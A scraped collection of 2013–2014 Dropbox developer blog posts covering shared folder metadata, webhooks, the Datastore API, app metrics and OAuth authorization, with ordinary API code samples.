{"website": "Dropbox", "title": "New in beta: shared folder metadata", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/new-in-beta-shared-folder-metadata", "abstract": "Demo Accessing shared folder metadata Join the beta! Today we're rolling out new shared folder metadata functionality, which lets developers see additional metadata about shared folders and the files within them. This metadata includes the users who are part of a shared folder, the permissions each user has in that folder, and who last modified each file in the folder. This is the first step towards providing programmatic access to create and manipulate shared folders in the Core API. The additional metadata also includes a new read_only field on shared folders and files within them. This should be used by apps to support the brand new view-only permission and is true if the authenticated user does not have permission to write to files in that shared folder. The new shared folder metadata is in production beta , which means that although the new functionality is in beta, we think it's stable enough for you to use in your production apps. To get access to the production beta, please complete this form , and we'll get back to you soon. Demo We put together a simple demo at sfmdemo.herokuapp.com that lets you browse your shared folders and shows you metadata about them. The full source code for the demo is available on GitHub: github.com/dropbox/sfmdemo . Accessing shared folder metadata The biggest addition to the Core API is the new /shared_folders endpoint, which provides your app with a list of a users' shared folders or details about a specific shared folder. This endpoint hasn't yet been added to our SDKs, but—like all of the Core API—it's straightforward to call it yourself. Below is an example curl command to get details about a user's shared folders: Copy curl https://api.dropbox.com/1/shared_folders -H \"Authorization:Bearer <YOUR-ACCESS-TOKEN>\" And here’s sample output: Copy [\r\n    ...\r\n    {\r\n        \"access_type\": \"owner\",\r\n        \"owner\": {\r\n            \"display_name\": \"Steve Marx\",\r\n            \"same_team\": true,\r\n            \"uid\": 178508400\r\n        },\r\n        \"path\": \"/sadkittens\",\r\n        \"shared_folder_id\": \"457064830\",\r\n        \"shared_folder_name\": \"sadkittens\"\r\n    }\r\n    ...\r\n] (Yes, I have a shared folder called “sadkittens”.) This call is used in the demo to show you your list of shared folders. Note that the access_type field tells me that I’m an “owner” of that shared folder. If someone else owned the folder and added me, I might be an “editor” or “viewer,” based on the new view-only shared folder permission . To access just the metadata about that specific “sadkittens” shared folder, you could use the same curl command but with the URL https://api.dropbox.com/1/shared_folders/457064830 . This is the call that’s used in the demo to show you shared folder membership when you click on a specific folder. As part of this beta, new shared folder information has been added to file and folder metadata, available through all the endpoints that return metadata, e.g. /metadata , /delta , /search , and /revisions . In the demo, once you’ve clicked on a shared folder, a /metadata call is used to get the list of files in the shared folder along with who last modified each file. When you click on an individual file, /revisions is called to show who modified the file in the past. Join the beta! The new shared folder metadata is in production beta. Production beta means that the API itself is stable and you can use it in your apps with real users, but we’re also planning on adding more functionality based on your feedback. When the API leaves production beta, the final version may look slightly different based on the feedback we’ve received, but we’ll continue to support the production beta APIs for three months after the final version is available. To get access to the beta, please fill out this form , and we’ll get back to you soon. UPDATE : Shared folder metadata is no longer in beta, so anyone can use it! To learn more about how to use the new functionality, please check take a look at the demo source code on GitHub and read the Core API documentation . // Tags Developers Announcements Api V1 Sample Apps Deprecated // Copy link Link copied Link copied", "date": "2014-07-23"},
{"website": "Dropbox", "title": "Announcing: Dropbox app metrics", "author": ["Li Chen Koh"], "link": "https://dropbox.tech/developers/announcing-dropbox-app-metrics", "abstract": "Li Chen Koh is a summer 2014 intern at Dropbox on the Developer Platform team. Have you ever wondered how much your users interact with your app? Have you released a new version of your app and wanted to see how many users you gained? Or do you just want to lean back and smugly admire the fruits of your labor, the extent of your app's dominion over the world? Rejoice, for you can answer these questions with absurd ease using the graphs that we provide: Total number of users of your app. The number of new users your app gains each day. The number of API calls your app makes each day. Excited? Awesome! To use this new feature, you just need to do the following: Jump onto the App Console at https://www.dropbox.com/developers/apps . 2. Click on your Awesome App! appmetrics-2 3. Click on the App Metrics tab. appmetrics-2 4. While sipping your favorite drink, inspect how awesome your app is! // Tags Developers Announcements Developer Tools // Copy link Link copied Link copied", "date": "2014-06-26"},
{"website": "Dropbox", "title": "Sync API and Datastore API 3.0 beta release", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/sync-api-and-datastore-api-3-0-beta-release", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Today we're excited to announce the beta release of our Sync and Datastore API 3.0 for Android, iOS, and OS X. This release contains a bunch of new features for the Datastore API as well as a few updates to the Sync API. New features for the Datastore API include: Additional datastore metadata: title — An optional field for storing a user-friendly title for the datastore. mtime — The last modified time for this datastore. Datastore size information: size — The current size of this datastore in bytes. recordCount — The total number of records in this datastore. unsyncedChangesSize — The size in bytes of changes that will be queued for upload by the next call to sync. Record size information, calculated by summing the size of all values in all fields, plus the base size of an empty record itself. The ability to create datastores with meaningful local IDs like \"settings\". (The default datastore is a datastore with the ID \"default.\") Datastores, tables, records, and fields can now have longer IDs, up to 64 characters. Bug fixes to edge cases of syncing and conflict resolution. There's also a preview of an upcoming feature: local datastores. This experimental feature allows you to use datastores in your app without requiring the user to log in to Dropbox first. Users can start using your app right away and can log in at any time to sync their data with Dropbox. This is just a preview so don't use it in production yet! Version 3.0 also includes a couple updates to the Sync API: Configurable file-system cache size. Batching of multiple file-system operations for faster upload. Android-specific updates include: Multiple account support (already exists for iOS and OS X). Background thread errors for DbxDatastoreStatus. iOS- and OS X-specific updates include: More detailed DBDatastoreStatus and DBSyncStatus, including background thread errors. This is a major release and contains some breaking changes so be sure to check out the changelog for full details. Since this is a beta release, there may be some bugs, but it's considered ready for general use (except the local datastores feature, which is not ready for production use yet). Try out the new Sync API 3.0 beta and the Datastore API 3.0 beta and let us know what you think on the developer forum . Your feedback is greatly appreciated! // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-05-28"},
{"website": "Dropbox", "title": "Webhooks launch party photos and slides", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/webhooks-launch-party-photos-and-slides", "abstract": "Last night was the launch party for our new API feature — webhooks! We met at Tres for tacos, margaritas, and an intro to webhooks talk by our own Steve Marx. Check out photos from the event or view the slides online . Interested in joining us for future events? Join our Meetup group . // Tags Developers Announcements Webhooks Automation // Copy link Link copied Link copied", "date": "2014-05-22"},
{"website": "Dropbox", "title": "Generate an access token for your own account", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/generate-an-access-token-for-your-own-account", "abstract": "When developers first start to use the Dropbox API, they often want to experiment with their own account before worrying about the complexities of authenticating other users. To make this easier, we recently added the ability to generate an OAuth 2 access token for your account with the click of a button. The new button can be found on the App Console for any Dropbox API app: Once you click that button, you'll see an OAuth 2 access token that you can use to make calls to the Dropbox API. For example, here's a curl command to fetch the account info for your account: Copy curl https://api.dropbox.com/1/account/info -H \"Authorization:Bearer <YOUR-ACCESS-TOKEN>\" Here’s similar code in Ruby: Copy require 'dropbox_sdk'\r\nclient = DropboxClient.new(\"<YOUR-ACCESS-TOKEN>\")\r\nputs client.account_info()[\"display_name\"] Note that the generated access token only works for your own Dropbox account. Once you deploy your app to other users, you'll need to use the standard OAuth authorization flow to acquire tokens for each user. // Tags Developers Tips Tricks Authorization Tips and Tricks Access Tokens // Copy link Link copied Link copied", "date": "2014-05-23"},
{"website": "Dropbox", "title": "Using Dropbox datastores in a Cordova app", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/using-dropbox-datastores-in-a-cordova-app", "abstract": "Migrating the tasks example to Cordova Get the code Update: The Sync and Datastore SDK has been deprecated. Learn more here. Apache Cordova is a platform for building cross-platform mobile apps using HTML, CSS, and JavaScript. Developers sometimes ask whether they can use Dropbox datastores in a Cordova app, and the answer is yes! The JavaScript Datastores SDK works as-is in a Cordova app. All you need to do is tell the library to use the Cordova \"auth driver,\" which takes just a single line of code. Migrating the tasks example to Cordova To learn about how to build Cordova apps using the Datastore API, I converted the tasks example that ships with the JavaScript SDK to run in a Cordova app. I published the final code on Github in the cordova-datastores-example repository . The modifications I made were quite minimal. I made a few cosmetic changes (added a <meta name=\"viewport\"> tag and updated some CSS), but otherwise I didn't do any work to optimize the UI for the phone form factor. In terms of making the code run properly in a Cordova app, I really only had to change the auth driver with the following line of code: Copy client.authDriver(new Dropbox.AuthDriver.Cordova()); The sample app originally used the default redirect auth driver. With that driver, the page is loaded again after authorization, so that code only checked for authorization on page load. To work better with the Cordova auth driver (and others like the pop-up auth driver), I refactored the code slightly. The new auth code looks like this: Copy function auth_callback() {\r\n    if (client.isAuthenticated()) { ... }\r\n    else { ... }\r\n}\r\n \r\n$('#loginButton').click(function (e) {\r\n    e.preventDefault();\r\n    // Start the OAuth authorization process.\r\n    client.authenticate(auth_callback);\r\n});\r\n \r\n// Try to finish OAuth authorization.\r\nclient.authenticate({ interactive: false }, auth_callback); This code may be better than the original tasks example code because it will work with any auth driver. Get the code The full source code for the Cordova sample is on Github: github.com/dropbox/cordova-datastores-example . To get the code running, you'll need to create a new Cordova project and then clone that repository into the www directory. Full instructions are in the README file on Github . Feel free to open issues or submit pull requests on Github! // Tags Developers Api V1 Cordova Sample Apps Deprecated // Copy link Link copied Link copied", "date": "2014-06-02"},
{"website": "Dropbox", "title": "How Cloud Cannon uses webhooks", "author": ["Mike Neumegen"], "link": "https://dropbox.tech/developers/how-cloud-cannon-uses-webhooks", "abstract": "Where Cloud Cannon uses webhooks How to use webhooks Developing locally Validation Predictability Give it a go NOTE : This is a guest post by Mike Neumegen, co-founder of Cloud Cannon , a CMS built on top of Dropbox syncing. Using the delta Dropbox API is a great way of tracking file changes from users. Until now the best way of receiving file changes was to poll the delta API as fast as possible. With the addition of webhooks to the Dropbox API, there’s a faster way. Now you can receive instant notification when a user changes files in their Dropbox. We’ve been using webhooks at Cloud Cannon since its beta in April and have learned how to really leverage them. Where Cloud Cannon uses webhooks Cloud Cannon is an easy way to get websites online and updatable for clients. Our customers put static website files in Dropbox, we download them to our server and turn them into a live website with a CMS. Webhooks are the fastest and most efficient way to get these files on our servers and keep them in sync. How to use webhooks Setting up webhooks is easy. First, you configure a URL endpoint which Dropbox will make a POST request to every time your users update files. Now it’s just a matter of performing delta calls on those users to get the set of changes. Developing locally With webhooks, Dropbox must call a public URL so it can be difficult to test in your local development environment. We get around this by using ngrok which exposes our local web server on the internet. Unfortunately this solution doesn't work for multiple developers. We ended up making a node.js app for local development which polls the delta API and simulates a webhook call. Validation You don’t want anyone calling your webhook endpoint. There’s a security check you should perform to make sure it’s actually Dropbox calling the webhook. The ugly part of getting this going is the hashing algorithm. Here are a couple examples of the validation: Ruby: Copy def valid_dropbox_request?(message)\r\n    digest = OpenSSL::Digest::SHA256.new\r\n    signature = OpenSSL::HMAC.hexdigest(digest, APP_SECRET, message)\r\n    request.headers['X-Dropbox-Signature'] == signature\r\nend Node.js: Copy var crypto = require('crypto');\r\n \r\nfunction isValidRequest(message, request) {\r\n    var signature = request.headers['x-dropbox-signature'],\r\n        hash = crypto.createHmac('SHA256', APP_SECRET).update(message).digest('hex');\r\n \r\n    return signature == hash\r\n}; Predictability When we were using the delta polling method for updating files it was easier to predict and control the load on our servers. If the load got too high we could slow down the polling rate. With webhooks it’s much trickier to predict load. If 10,000 users start concurrently update files, the webhook endpoint could be saturated with incoming requests. We’ve reduced this risk by processing the webhook calls as fast as possible. This is important because it reduces the chance the endpoint will get overloaded. Also, Dropbox will cut the connection if it doesn’t receive a response within 10 seconds. To get this speed we perform the delta calls for users in the webhook, then put the file operations on a queue to process later. Give it a go The switch to webhooks has meant we can provide a far superior experience to our customers. Before our users would drag files into Dropbox and wait a couple of seconds for them to appear on Cloud Cannon, now it’s instant. // Tags Developers Developer Spotlight Webhooks Partners // Copy link Link copied Link copied", "date": "2014-05-19"},
{"website": "Dropbox", "title": "dropbox_hook.py: a tool for testing your webhooks", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dropbox_hook-py-a-tool-for-testing-your-webhooks", "abstract": "Usage Get the tool A lot of early questions we got after launching the new webhooks feature were around how to develop and test a webhook locally. I put together a small command-line tool to make testing webhooks easier. It's called dropbox_hook.py , and it sends fake webhook requests to mimic what Dropbox itself sends. Usage To generate a verification request , run the following: Copy dropbox_hook.py verify http://127.0.0.1/your-webhook-url To do that, run the following: Copy dropbox_hook.py notify http://127.0.0.1/your-webhook-url --secret abc123xyz --user 12345678 The --secret option should be your Dropbox app secret. The --user option should be a numeric Dropbox user ID. (In your production app, you'll retrieve a user's user ID during OAuth or by calling /account/info .) Get the tool The full source code for the tool is on Github: github.com/dropbox/dropbox_hook . Feel free to open issues or submit pull requests with changes! // Tags Developers Python Sample Apps Webhooks Developer Tools // Copy link Link copied Link copied", "date": "2014-05-16"},
{"website": "Dropbox", "title": "Dropbox talks at APIDays in Berlin and Barcelona", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/dropbox-talks-at-apidays-in-berlin-and-barcelona", "abstract": "In the next few weeks I'll be speaking at both APIDays in Berlin and Barcelona . I'll be tallking about cloud sync for mobile developers using the Dropbox APIs. APIDays bills itself as the premier conference on APIs and includes a variety of speakers from companies such as Twitter, SoundCloud, and Heroku. Here are the details: APIDays Berlin Berlin, Germany May 5th and 6th \"Cloud Sync for Mobile Developers\" at 16:20 on Tuesday, May 6th APIDays Mediterranea Barcelona, Spain May 29th and 30th Exact talk time TBD Hope to see you there! Update: Slides from my talk at APIDays Berlin are published here . Hope to see you in Barcelona! // Tags Developers Developer Community // Copy link Link copied Link copied", "date": "2014-04-29"},
{"website": "Dropbox", "title": "Dropbox authorization in a Windows Store app", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/dropbox-authorization-in-a-windows-store-app", "abstract": "JavaScript code C# code Last week, I showed how to perform Dropbox authorization in a Windows Forms app . This time, we'll do the same thing but in a Windows Store app, where we get to take advantage of the WebAuthenticationBroker . I've written a simple function in both JavaScript and C# that performs Dropbox authorization and returns the user's access token. JavaScript code Copy app.authorizeWithDropbox = function () {\r\n    // Be sure to replace this with your app key from dropbox.com/developers/apps.\r\n    var appKey = \"<YOUR APP KEY>\";\r\n \r\n    var vault = new Windows.Security.Credentials.PasswordVault();\r\n \r\n    // Check for previously saved credentials.\r\n    var creds = vault.retrieveAll();\r\n    if (creds.length > 0) {\r\n        var cred = creds[0];\r\n        cred.retrievePassword();\r\n        var accessToken = cred.password;\r\n        return WinJS.Promise.as(accessToken);\r\n    }\r\n \r\n    // The redirect URI you use doesn't really matter, so feel free to use something else,\r\n    // but this is one we've set up specifically for client-side apps to use.\r\n    var redirectUri = \"https://www.dropbox.com/1/oauth2/redirect_receiver\";\r\n \r\n    return Windows.Security.Authentication.Web.WebAuthenticationBroker.authenticateAsync(\r\n        Windows.Security.Authentication.Web.WebAuthenticationOptions.none,\r\n        Windows.Foundation.Uri(\r\n            \"https://www.dropbox.com/1/oauth2/authorize?response_type=token&redirect_uri=\"\r\n            + redirectUri + \"&client_id=\" + appKey),\r\n        Windows.Foundation.Uri(redirectUri))\r\n    .then(function (result) {\r\n        // Parse the URL to find the user ID and access token.\r\n        var url = new Windows.Foundation.Uri(result.responseData);\r\n        var decoder = new Windows.Foundation.WwwFormUrlDecoder(url.fragment.substring(1));\r\n        var uid = decoder.getFirstValueByName(\"uid\");\r\n        var accessToken = decoder.getFirstValueByName(\"access_token\");\r\n \r\n        // Save the access token so the user doesn't have to log in next time.\r\n        vault.add(new Windows.Security.Credentials.PasswordCredential(\r\n            \"Dropbox auth sample app\",\r\n            uid,\r\n            accessToken\r\n        ));\r\n \r\n        return accessToken;\r\n    });\r\n}; C# code Copy private async Task AuthorizeWithDropbox()\r\n{\r\n    // Be sure to replace this with your app key from dropbox.com/developers/apps.\r\n    var appKey = \"<YOUR APP KEY>\";\r\n \r\n    // Check for previously saved credentials.\r\n    var vault = new PasswordVault();\r\n    var existing = vault.RetrieveAll().FirstOrDefault();\r\n    if (existing != null)\r\n    {\r\n        existing.RetrievePassword();\r\n        var accessToken = existing.Password;\r\n        return accessToken;\r\n    }\r\n \r\n    // The redirect URI you use doesn't really matter, so feel free to use something else,\r\n    // but this is one we've set up specifically for client-side apps to use.\r\n    var redirectUri = new Uri(\"https://www.dropbox.com/1/oauth2/redirect_receiver\");\r\n \r\n    var uri = new Uri(\r\n        string.Format(\r\n            @\"https://www.dropbox.com/1/oauth2/authorize?response_type=token&redirect_uri={0}&client_id={1}\",\r\n            redirectUri, appKey));\r\n    var result = await WebAuthenticationBroker.AuthenticateAsync(WebAuthenticationOptions.None, uri, redirectUri);\r\n \r\n    // Parse the URL to find the user ID and access token.\r\n    var url = result.ResponseData.ToString();\r\n    var decoder = new WwwFormUrlDecoder(new Uri(url).Fragment.Substring(1));\r\n    var uid = decoder.GetFirstValueByName(\"uid\");\r\n    var accessToken = decoder.GetFirstValueByName(\"access_token\");\r\n \r\n    // Save the access token so the user doesn't have to log in next time.\r\n    vault.Add(new PasswordCredential(\"Dropbox auth demo app\", uid, accessToken));\r\n \r\n    return accessToken;\r\n} I hope this helps those of you who are building Windows apps that integrate with Dropbox! If you have questions, please let us know on the developer forum. // Tags Developers Tips Tricks Deprecated // Copy link Link copied Link copied", "date": "2014-04-11"},
{"website": "Dropbox", "title": "Announcing Dropbox webhooks", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/announcing-dropbox-webhooks", "abstract": "What's a webhook? What can you do with webhooks? I'm excited to announce Dropbox webhooks, a way for server-side apps to get real-time notifications about file changes in Dropbox. Client-side applications have already been able to get low-latency notifications via longpoll_delta or the built-in notifications in the Sync API . Webhooks give this same ability to server-side apps, eliminating the need for polling. What's a webhook? In general, a webhook is a way for an app developer to specify a URI to receive notifications based on some trigger. In the case of Dropbox, notifications get sent to your webhook URI every time a user of your app makes a file change. The payload of the webhook is a list of user IDs who have changes. Your app can then use the standard delta method to see what changed and respond accordingly. What can you do with webhooks? Webhooks are great for any app that needs to respond quickly to changes in Dropbox. In the webhooks tutorial , we show an example app that converts Markdown files to HTML as soon as they're added to Dropbox. We released webhooks to a few companies in private beta to better understand how the feature would be used in real apps. Here's how two of those companies are using webhooks today: Picturelife stores all your photos and videos securely in the cloud, giving you access to them wherever you are. Here's what Nate Westheimer, CEO of Picturelife, had to say about webhooks: \"The new webhooks API is perfect for apps like Picturelife. Our backend sync services now get to work smarter, not harder. Rather than constantly making thousands of requests, polling for changes, we get to sit back and wait for users to make changes, and then only make the requests we need. Meanwhile, this new API turns out to be a real win for our customers too. With webhooks, our users now have the best, most up-to-date experience, right when they login to Picturelife.\" Slack brings all your communication together in one place. It’s real-time messaging, archiving and search for modern teams. Here's what Myles Grant, an engineer at Slack, said: \"Dropbox webhooks only took a weekend to implement and replaced dedicated polling servers with our standard event-handling infrastructure, while providing a better, instantaneous experience for our users.\" To get started using webhooks in your own app, check out the tutorial and reference documentation on the developer site. As always, let us know if you have any feedback via the developer forum .Get started J oin us for our webhooks launch party next Wednesday evening! // Tags Developers Announcements Api V1 Webhooks // Copy link Link copied Link copied", "date": "2014-05-14"},
{"website": "Dropbox", "title": "New additional information about photo and video files", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/new-additional-information-about-photo-and-video-files", "abstract": "Yesterday we launched Carousel , a beautiful gallery for all your photos and videos. Today we're happy to announce that we've updated our API to better support photos and videos. Specifically, we've added more metadata about media files. You can now use the include_media_info parameter to fetch additional information about photos and videos in the /metadata endpoint. Here's an example: http://api.dropbox.com/1/metadata/auto/?include_media_info=true Copy {\r\n  path: \"/\",\r\n  contents: [\r\n    {\r\n      path: \"/flower.jpg\",\r\n      photo_info: {\r\n        time_taken: \"Wed, 28 Aug 2013 18:12:02 +0000\",\r\n        lat_long: [\r\n          37.77256666666666,\r\n          -122.45934166666667\r\n        ]\r\n      },\r\n      ...\r\n    },\r\n    {\r\n      path: \"/beach.mov\",\r\n      video_info: {\r\n        duration: 4463,\r\n        time_taken: \"Fri, 13 Dec 2013 17:54:38 +0000\",\r\n        lat_long: [\r\n          37.770338,\r\n          -122.513565\r\n        ]\r\n      },\r\n      ...\r\n    }\r\n  ]\r\n  ...\r\n} Currently you can get the following data for each media file: Photo: time taken, GPS coordinates Video: time taken, GPS coordinates, video duration The time_taken and lat_long values are generated from the Exif data associated with the media file and we've nicely formatted this data to make it more useful to developers. Apps can now display when a photo or video was taken rather than just when it was uploaded to Dropbox. This also allows for sorting a user's media by creation date. GPS coordinates are interesting for showing where a photo or video was taken, possibly on a map view. Apps could also group photos and videos based on location. If you're using the /delta endpoint to stay up to date with changes to the user's Dropbox, you can also use the include_media_info parameter to get this additional information. A cool use of media info in the /delta endpoint would be to find out in real-time when a photo or video is taken within a certain geo-fence. A big thanks to our developer community for suggesting these features. We're working on adding more useful information about media files so let us know what you think on our developer forum and stay tuned for updates! // Tags Developers Announcements Api V1 Images Deprecated // Copy link Link copied Link copied", "date": "2014-04-10"},
{"website": "Dropbox", "title": "Click the Box: a cross-platform, open-source game using the Datastore API", "author": ["Steve Marx And Leah Culver"], "link": "https://dropbox.tech/developers/click-the-box-a-cross-platform-open-source-game-using-the-datastore-api", "abstract": "Get the code! Update: The Sync and Datastore SDK has been deprecated. Learn more here. Here on the Dropbox developer relations team, one of our favorite things to do with the Dropbox Datastore API is to play games. Hot on the heels of our runaway successes Dropbox 2048 and Lucky Shamrock , today we're releasing Click the Box, a really simple game that demonstrates how the Datastore API can be used to sync game state. You can play the game in your browser at clickthebox.site44.com . Try opening it in multiple browser tabs to see it sync in real-time! Get the code! The full source code for Click the Box is on GitHub for three different platforms: JavaScript , iOS , and Android . // Tags Developers Sample Apps Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-03-27"},
{"website": "Dropbox", "title": "Dropbox Datastore API meetup: slides and video", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/dropbox-datastore-api-meetup-slides-and-video", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. We hosted our first Dropbox Platform Meetup here at Dropbox HQ last Wednesday night. Guido van Rossum gave a talk on our Datastore API with a quick intro talk by Steve Marx. Slides from the talk: https://www.dropbox.com/s/8k73c8e73ty0n3k/ConflictResolution2014.pdf It was great to meet developers working with the API platform. Thanks to everyone who attended! If you'd like to get notified about our next meetup, join our Dropbox Platform Meetup group . // Tags Developers Developer Community Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-02-24"},
{"website": "Dropbox", "title": "Dropbox 2048 saves your current game and high scores", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/dropbox-2048-saves-your-current-game-and-high-scores", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Maybe you've seen the game 2048 ? It's fun and highly addictive. We've been playing it a lot (maybe too much?) here at Dropbox and thought it would be fun to add some modifications. The original source code is on GitHub , so we forked it and added two new features that take advantage of the Dropbox Datastore API : the ability to save your current game and a list of your high scores. Dropbox 2048 Our version, Dropbox 2048 , will save your current game so that you can switch from computer to phone and pick up where you left off. It also shows your top 3 high scores along with the max tile value you achieved. The Dropbox Datastore API provides an easy way to store game data for a user. Behind the scenes, the Datastore API actually stores the data in the user's own Dropbox. If you connect Dropbox 2048 with your Dropbox account, you can see your game data here . By adding the ability to persist data to 2048, we've actually enabled a lot more new features to be built. So feel free to fork and add some more! Anyone want to add \"undo\"?? // Tags Developers Ios Api V1 Sample Apps Deprecated // Copy link Link copied Link copied", "date": "2014-03-21"},
{"website": "Dropbox", "title": "Lucky Shamrock: saving game state with the Datastore API", "author": ["Leah Culver And Steve Marx"], "link": "https://dropbox.tech/developers/lucky-shamrock-saving-game-state-with-the-datastore-api", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. Happy St. Patrick's Day! For the holiday, we created a simple game using the Datastore API to demonstrate saving game state with conflict resolution rules. Play the Lucky Shamrock game! The goal of the Lucky Shamrock game is easy, just find the four-leaf clover in the field of three-leaf clovers. A resolution rule is how the Datastore API determines what do with a field in the case of a conflict. Conflicting data can occur when two devices change the contents of a datastore simultaneously, or if data is modified when one or both of the devices are offline. The Lucky Shamrock game saves two pieces of game data: your best time and the total number of games played. Your best time is saved in a field called min_time and the resolution rule for the field is set to min . This means that in the case of a conflict we want to choose the minimum value (the fastest time). Copy table.setResolutionRule('min_time', 'min'); Your total games played is stored in a field called game_count and the resolution rule is sum . If there’s a conflict we want to save the total number of games played which involves adding up all games played across devices or instances of the game. Copy table.setResolutionRule('game_count', 'sum'); Lucky Shamrock is a basic example of using the Dropbox Datastore API to save a user's game state and shows how to use conflict resolution rules to determine the value of a fields in case of a conflict. If you want to see your data update as you play the game, you can watch the data update live in the datastore browser . The full code for Lucky Shamrock is available here . // Tags Developers Sample Apps Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-03-17"},
{"website": "Dropbox", "title": "Datastore API growth", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/datastore-api-growth", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. DBX , our first developer conference, was a big event for us on the Platform team. It was the first time we’ve gathered developers excited about building apps that integrate with Dropbox. We took the opportunity to release updates to all of our APIs, and also release something brand new: the Datastore API . If you haven’t heard of datastores yet, it's something brand new for Dropbox. Now, in addition to syncing files, you can use Dropbox to sync and store structured data for your users too. A datastore is an embedded database for your app (kind of like SQLite) that is owned by a user and stored in their Dropbox. Just like files, datastores sync seamlessly across platforms so you can work with datastores on web sites, web servers, mobile devices, and desktop computers. That means that your app can sync settings, to-do lists, contacts, game saves, or any other structured data you need. At DBX, we launched the Datastore API in beta on iOS, Android, and JavaScript. Since then, we’ve been making steady improvements: We stabilized the API and removed it from beta, making it an officially supported part of the platform. We launched the HTTP endpoints and Python SDK so your servers can now talk to datastores. We added OS X support for Datastore API . After DBX, we were excited to see the community adopt datastores and release open source tools as well. Thanks to their hard work, now you can use datastores in your Xamarin or AngularJS apps, and even with Core Data . Today, we’re seeing developers sync all sorts of data. Some great examples of apps using datastores are Diaro , which syncs journals between Android and the web, and Planner Plus , which syncs calendars and reminders between iOS devices. There are a lot more exciting things to come for datastores but we’re even more excited to see what you build with it. Keep an eye on this blog and on @dropboxapi on Twitter to stay informed, and if you have any requests, feedback, apps, or open source projects for the Datastore API, we’d love to hear about them on the developer forum . // Tags Developers Announcements Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-02-10"},
{"website": "Dropbox", "title": "Is it Christmas? Find out with Dropbox", "author": ["Steve Marx"], "link": "https://dropbox.tech/developers/is-it-christmas-find-out-with-dropbox", "abstract": "How it works Try it out! Inspired by the novelty Twitter account @isitchristmas , a few of us here at Dropbox put together the website Is it Christmas? , which answers the question by adding a cute photo to your Dropbox each day. Not only is this app adorable, but it demonstrates how a service can periodically update a user's Dropbox using copy_ref . How it works The app is built in Python and uses a handful of Core API methods: /oauth2/authorize and /oauth2/token to log in a user. /media to generate a URL for the image on the home page (which changes each day). /copy_ref and /fileops/copy to copy a file from my Dropbox account (where the images are stored) to each user's account. The app stores state in Redis, including the access tokens for users of the app, users' time zones, and the last photo that was added to their Dropbox. This information is all that's needed to update every user's Dropbox every day at midnight (in their time zone). This work is done periodically via a cron job: Copy def update_if_needed(uid, redis_client, my_token):\r\n    '''For a given user, copy a new photo into their Dropbox if needed.'''\r\n \r\n    # Get the user's access token from Redis.\r\n    access_token = redis_client.hget('tokens', uid)\r\n \r\n    # Get the time zone, or use Pacific time by default.\r\n    tz = redis_client.hget('timezones', uid) or '-8'\r\n \r\n    date = (datetime.utcnow() + timedelta(hours=int(tz))).strftime('%Y-%m-%d')\r\n \r\n    # If the user hasn't been updated yet today, copy in a new photo.\r\n    if redis_client.hget('last_update', uid) != date:\r\n \r\n        # Get a copy ref from the master account\r\n        copy_ref = get_copy_ref(my_token, date)\r\n \r\n        client = DropboxClient(access_token)\r\n        try:\r\n            # Add the photo\r\n            client.add_copy_ref(copy_ref, 'Is %s Christmas.jpg' % date)\r\n        except:\r\n            # Ignore all errors! Probably a bad idea, but the most common\r\n            # error is that there's a conflict because the user actually\r\n            # already has this file. TODO: Catch that specifically. :-)\r\n            pass\r\n \r\n        # Track the last update so we don't revisit this user until tomorrow.\r\n        redis_client.hset('last_update', uid, date)\r\n \r\n@app.route('/cron')\r\ndef cron():\r\n    '''Cron job, triggered remotely on a regular basis by hitting this URL.'''\r\n \r\n    # Update any users that need it.\r\n    for uid in redis_client.hkeys('tokens'):\r\n        update_if_needed(uid, redis_client, my_token)\r\n \r\n    return 'Okay.' Try it out! You can try the app out for yourself at isitchristmas.herokuapp.com . For the source, check out the code on GitHub . // Tags Developers Sample Apps Api V1 Deprecated // Copy link Link copied Link copied", "date": "2013-12-18"},
{"website": "Dropbox", "title": "Dropbox Platform meetup with Guido van Rossum", "author": ["Leah Culver"], "link": "https://dropbox.tech/developers/dropbox-platform-meetup-with-guido-van-rossum", "abstract": "Update: The Sync and Datastore SDK has been deprecated. Learn more here. We're happy to announce our first developer meetup here at Dropbox HQ. Guido van Rossum, creator of Python, will be speaking about his work at Dropbox on the new Datastore API . Dropbox Datastores by Guido van Rossum rn Wednesday, February 12, 2014 at 7:30 PM Dropbox, 185 Berry St, San Francisco, CA Learn how you can use Datastores to synchronize your app's data across multiple devices. There will also be socializing and snacks provided. You'll need to RSVP for the event here . If you can't make it this time but would like to attend future meetups, please join our meetup group! // Tags Developers Api V1 Deprecated // Copy link Link copied Link copied", "date": "2014-01-29"},
